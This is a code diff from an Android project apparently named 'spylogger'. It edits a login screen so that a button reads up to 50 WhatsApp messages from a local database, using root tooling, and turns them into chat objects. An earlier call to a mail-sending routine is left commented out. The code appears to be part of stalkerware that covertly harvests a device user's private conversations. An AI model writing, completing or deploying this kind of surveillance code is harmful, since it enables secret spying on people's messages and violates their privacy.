@@ -3,22 +3,20 @@ package com.gravatasufoca.spylogger.activities;
 import android.animation.Animator;
 import android.animation.AnimatorListenerAdapter;
 import android.annotation.TargetApi;
-import android.content.Context;
-import android.content.pm.PackageManager;
-import android.support.annotation.NonNull;
-import android.support.design.widget.Snackbar;
-import android.support.v7.app.AppCompatActivity;
 import android.app.LoaderManager.LoaderCallbacks;
-
+import android.content.Context;
 import android.content.CursorLoader;
 import android.content.Loader;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.AsyncTask;
-
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.ContactsContract;
+import android.support.annotation.NonNull;
+import android.support.design.widget.Snackbar;
+import android.support.v7.app.AppCompatActivity;
 import android.text.TextUtils;
 import android.view.KeyEvent;
 import android.view.View;
@@ -33,13 +31,22 @@ import android.widget.Toast;
 
 import com.google.android.gms.auth.GoogleAuthException;
 import com.google.android.gms.auth.UserRecoverableAuthException;
-import com.gravatasufoca.spylogger.utils.Utils;
+import com.gravatasufoca.spylogger.ChatVOFactory;
 import com.gravatasufoca.spylogger.R;
+import com.gravatasufoca.spylogger.dao.whatsapp.DatabaseHelperInternal;
+import com.gravatasufoca.spylogger.model.whatsapp.Messages;
+import com.gravatasufoca.spylogger.utils.Utils;
+import com.gravatasufoca.spylogger.vos.ChatVO;
+import com.j256.ormlite.dao.CloseableIterator;
+import com.j256.ormlite.dao.Dao;
+import com.j256.ormlite.dao.GenericRawResults;
+import com.j256.ormlite.stmt.QueryBuilder;
 import com.stericson.RootTools.RootTools;
 import com.stericson.RootTools.exceptions.RootDeniedException;
 import com.utilidades.gravata.utils.Utilidades;
 
 import java.io.IOException;
+import java.sql.SQLException;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.TimeoutException;
@@ -115,18 +122,48 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
         });
 
         Button mEmailSignInButton = (Button) findViewById(R.id.email_sign_in_button);
+        Button mEmailSignInButton2 = (Button) findViewById(R.id.button2);
         mEmailSignInButton.setOnClickListener(new OnClickListener() {
             @Override
             public void onClick(View view) {
 //                attemptLogin();
                 Utils.startNewService(context);
+            }
+        });
+
+        mEmailSignInButton2.setOnClickListener(new OnClickListener() {
+            @Override
+            public void onClick(View view) {
+//                Utils.sendMail(context);
+                Utils.context=context;
                 try {
-                    // Simulate network access.
-                    Thread.sleep(5000);
-                    Utils.sendMail(context);
-                } catch (InterruptedException e) {
-//                    return false;
+                    Dao<Messages, Integer> daoMessage= (new DatabaseHelperInternal(context)).getMessagesDao();
+                    List<Messages> mensagens=new ArrayList<>();
+
+                    GenericRawResults<String[]> rawResults= daoMessage.queryRaw("select * from messages where key_remote_jid !=-1 ");
+
+                    QueryBuilder<Messages, Integer> qb = daoMessage.queryBuilder();
+                    qb.where().ne("key_remote_jid","-1");
+                    qb.limit(50L);
+                    CloseableIterator<Messages> iterator = daoMessage.iterator(qb.prepare());
+                    try {
+                        while (iterator.hasNext()) {
+                            mensagens.add(iterator.next());
+                        }
+                    }finally {
+                        try {
+                            iterator.close();
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                    }
+
+                    List<ChatVO> msgs=(new ChatVOFactory()).getChats(mensagens);
+
+                } catch (SQLException e) {
+                    e.printStackTrace();
                 }
+
             }
         });
 
